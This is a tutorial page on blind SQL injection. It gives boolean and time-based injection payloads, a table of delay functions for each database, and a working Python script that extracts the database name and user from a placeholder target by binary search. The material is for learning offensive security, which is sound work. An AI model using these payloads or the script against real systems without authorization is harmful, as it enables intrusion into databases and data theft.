---
title: 'Blind SQL Injection'
description: 'Deep dive into Boolean-based and Time-based blind SQL injection, including binary search concepts and a sample Python script for automated extraction.'
icon: material/eye-off
tags:
  - sql-injection
  - blind
  - boolean-sqli
  - time-based-sqli
---

# Blind SQL Injection (Inferential)

When the application does not return data or database errors directly to the user, you are dealing with **Blind SQL Injection**. You cannot simply `UNION SELECT` the data onto the screen.

Instead, you must ask the database a series of True/False questions and **infer** the answer based on how the application responds.

---

## Boolean-Based Blind SQLi

Boolean-based blind relies on the application returning a **different response** (e.g., "User exists" vs. "User not found", or a 200 OK vs. a 500 Error) depending on whether the injected condition evaluates to `TRUE` or `FALSE`.

### The Binary Search Technique

Extracting a string character-by-character by asking "Is the first character 'a'? Is it 'b'?" is too slow. Instead, we use a binary search approach asking "Is the ASCII value greater than X?"

Let's say we want to extract the database name.

1.  **Find the length:**
    ```sql
    ' AND LENGTH(database()) = 9--  (False -> page changes)
    ' AND LENGTH(database()) = 10-- (True -> normal page)
    ```
2.  **Extract character 1 (Binary Search):**
    ```sql
    -- ASCII value of 'a' is 97, 'z' is 122. Midpoint is ~109 ('m').
    ' AND ASCII(SUBSTRING(database(),1,1)) > 109-- (True -> char is > 'm')
    ' AND ASCII(SUBSTRING(database(),1,1)) > 115-- (False -> char is <= 's')
    ' AND ASCII(SUBSTRING(database(),1,1)) = 114-- (True -> char is 'r')
    ```
3.  **Repeat for characters 2 through 10.**

### Automated Boolean Extraction Script

Because manual extraction is incredibly tedious, it is almost always automated using tools like SQLMap or custom scripts.

```python title="boolean_blind_extract.py"
#!/usr/bin/env python3
"""Boolean-based blind SQL injection data extractor."""

import requests
import string

TARGET = "http://target.com/search"
TRUE_INDICATOR = "Results found"  # String present when condition is TRUE

def inject(payload: str) -> bool:
    """Send injection payload and return True if condition was TRUE."""
    params = {"q": f"' AND {payload}-- -"}
    response = requests.get(TARGET, params=params)
    return TRUE_INDICATOR in response.text

def extract_char(query: str, position: int) -> str:
    """Extract a single character using binary search."""
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        # Test: ASCII value of char at position > mid?
        if inject(f"ASCII(SUBSTRING(({query}),{position},1))>{mid}"):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low)

def extract_string(query: str, max_length: int = 64) -> str:
    """Extract a full string character by character."""
    result = ""
    for i in range(1, max_length + 1):
        char = extract_char(query, i)
        if char == " " or char == chr(32):
            # Check if we've reached the end
            if inject(f"LENGTH(({query}))<{i}"):
                break
        result += char
        print(f"\r[*] Extracting: {result}", end="", flush=True)
    print()
    return result

if __name__ == "__main__":
    print("[+] Extracting database name...")
    db_name = extract_string("SELECT database()")
    print(f"[+] Database: {db_name}")

    print("[+] Extracting current user...")
    user = extract_string("SELECT user()")
    print(f"[+] User: {user}")
```

---

## Time-Based Blind SQLi

Time-Based blind is used when the application provides **no visible difference** between a True and False response. To infer information, the attacker crafts a payload that pauses the database execution (delays the response) **only if** a specific condition is True.

### Time-Based Functions

| DBMS | Function |
|---|---|
| **MySQL** | `SLEEP(5)` |
| **PostgreSQL**| `pg_sleep(5)` |
| **MSSQL** | `WAITFOR DELAY '0:0:5'` |
| **Oracle** | `DBMS_PIPE.RECEIVE_MESSAGE('a',5)` |

### Exploitation Example (MySQL)

Extracting the first character of the database name:

```sql title="Time-Based Character Extraction"
' AND IF(ASCII(SUBSTRING(database(),1,1))=114, SLEEP(5), 0)--
```

If the web server takes ~5 seconds to respond, the condition is `TRUE` (the first character is 'r'). If it responds immediately, the condition is `FALSE`.

### Time-Based Extraction Script Modifications

To adapt the Python script above for Time-Based blind, you measure the response time instead of looking for text.

```python title="Time-Based inject() function"
import time

def inject_time(payload: str) -> bool:
    """Return True if the response took >= 5 seconds."""
    # MySQL IF() statement: IF(condition, true_action, false_action)
    full_payload = f"' AND IF({payload}, SLEEP(5), 0)-- -"
    params = {"q": full_payload}
    
    start_time = time.time()
    requests.get(TARGET, params=params)
    end_time = time.time()
    
    return (end_time - start_time) >= 5.0
```

!!! warning "Network Latency"
    Time-based SQLi is sensitive to network latency. If the server normally takes 3 seconds to respond under heavy load, a `SLEEP(2)` payload will produce false positives. Always set your delay to be significantly higher than the average response time.
